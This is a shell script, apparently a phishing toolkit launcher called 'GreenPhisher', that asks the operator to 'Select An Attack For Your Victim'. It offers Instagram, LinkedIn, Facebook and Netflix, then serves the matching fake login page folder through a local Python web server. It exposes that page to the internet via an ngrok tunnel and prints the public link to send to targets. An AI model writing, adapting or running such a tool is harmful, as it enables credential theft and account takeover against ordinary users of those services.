#!/bin/sh
RED='\033[0;31m'
NC='\033[0m' # No Color
GREEN='\033[0;92m'        # Green
UGREEN='\033[4;32m'       # Green
Yellow='\033[0;33m'
Black='\033[0;30m'        # Black
Purple='\033[0;35m'       # Purple

clear
echo "${GREEN}░██████╗░██████╗░███████╗███████╗███╗░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░${NC} "
echo "${GREEN}██╔════╝░██╔══██╗██╔════╝██╔════╝████╗░██║██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗${NC} "
echo "${GREEN}██║░░██╗░██████╔╝█████╗░░█████╗░░██╔██╗██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝${NC} "
echo "${GREEN}██║░░╚██╗██╔══██╗██╔══╝░░██╔══╝░░██║╚████║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗${NC} "
echo "${GREEN}╚██████╔╝██║░░██║███████╗███████╗██║░╚███║██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║${NC} "
echo "${GREEN}░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝${NC} "

echo "\n"                                                                                         
echo "\t\t\t\t\t\t\t\t\t\t ~ Madhav Shah"
echo 
echo 


if [ -f ngrok ]
then
echo "${RED}INSTALLING DEPENDENTIES ${NC}"
echo 
echo 
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo apt install unzip
sudo apt-get install python3.6
clear
fi

echo "${RED}[${NC}::${RED}] ${NC} ${Yellow}Select An Attack For Your Victim ${NC}${RED}[${NC}::${RED}]${NC}"
echo 


echo "${RED}[${NC}1${RED}]${NC}${Yellow}Instagram ${NC} "
echo "${RED}[${NC}2${RED}]${NC}${Yellow}Linkedin ${NC} "
echo "${RED}[${NC}3${RED}]${NC}${Yellow}Facebook ${NC} "
echo "${RED}[${NC}4${RED}]${NC}${Yellow}Netflix ${NC} "
echo
echo "${RED}[${NC}99${RED}]${NC}${Yellow}Kill all webservers and ngrok ${NC}      ${RED}[${NC}00${RED}]${NC}${Yellow}Exit ${NC}"



echo 
echo 
echo "${RED}[${NC}-${RED}]${NC}${GREEN}Select an option :${NC}"
read n
sleep 1
clear

echo "${GREEN}░██████╗░██████╗░███████╗███████╗███╗░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░${NC} "
echo "${GREEN}██╔════╝░██╔══██╗██╔════╝██╔════╝████╗░██║██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗${NC} "
echo "${GREEN}██║░░██╗░██████╔╝█████╗░░█████╗░░██╔██╗██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝${NC} "
echo "${GREEN}██║░░╚██╗██╔══██╗██╔══╝░░██╔══╝░░██║╚████║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗${NC} "
echo "${GREEN}╚██████╔╝██║░░██║███████╗███████╗██║░╚███║██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║${NC} "
echo "${GREEN}░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝${NC} "

echo "\n"                                                                                         
echo "\t\t\t\t\t\t\t\t\t\t ~ Madhav Shah"
echo 
echo 


if [ $n -eq 1 ];
then
cd phishingpages
cd instagram
echo "${RED}[${NC}-${RED}]${NC}${Yellow}Initializing...${NC}${RED}(${NC}${Yellow}http://127.0.0.1:4444${NC}${RED})${NC}"
sleep 1
echo "${RED}[${NC}-${RED}]${NC}${Yellow}${Yellow}Launching ngrok....${NC}"
sleep 3
ngrok http --bind-tls=true --log=stdout 4444 > /dev/null &
sleep 3

echo "${RED}[${NC}-${RED}]${NC}${Purple}URL 1${NC}:${GREEN} $link ${NC}"  
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io'
python3 -m http.server 4444 & 






elif [ $n -eq 2 ];
then
cd phishingpages
cd linkedin
echo "${RED}[${NC}-${RED}]${NC}${Yellow}Initializing...${NC}${RED}(${NC}${Yellow}http://127.0.0.1:4444${NC}${RED})${NC}"
sleep 1
echo "${RED}[${NC}-${RED}]${NC}${Yellow}${Yellow}Launching ngrok....${NC}"
sleep 3

ngrok http --bind-tls=true --log=stdout 4444 > /dev/null &
sleep 3
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io'
python3 -m http.server 4444 & 



elif [ $n -eq 3 ];
then
cd phishingpages
cd facebook
echo "${RED}[${NC}-${RED}]${NC}${Yellow}Initializing...${NC}${RED}(${NC}${Yellow}http://127.0.0.1:4444${NC}${RED})${NC}"
sleep 1
echo "${RED}[${NC}-${RED}]${NC}${Yellow}${Yellow}Launching ngrok....${NC}"
sleep 3

ngrok http --bind-tls=true --log=stdout 4444 > /dev/null &
sleep 3
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io'
python3 -m http.server 4444 & 



elif [ $n -eq 4 ];
then
cd phishingpages
cd netflix
echo "${RED}[${NC}-${RED}]${NC}${Yellow}Initializing...${NC}${RED}(${NC}${Yellow}http://127.0.0.1:4444${NC}${RED})${NC}"
sleep 1
echo "${RED}[${NC}-${RED}]${NC}${Yellow}${Yellow}Launching ngrok....${NC}"
sleep 3

ngrok http --bind-tls=true --log=stdout 4444 > /dev/null &
sleep 3
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io'
python3 -m http.server 4444 & 




elif [ $n -eq 99 ];
then
killall ngrok 
sudo pkill -9 python


elif [ $n -eq 00 ];
then
exit


else
echo "Sorry, please enter valid choice"
fi



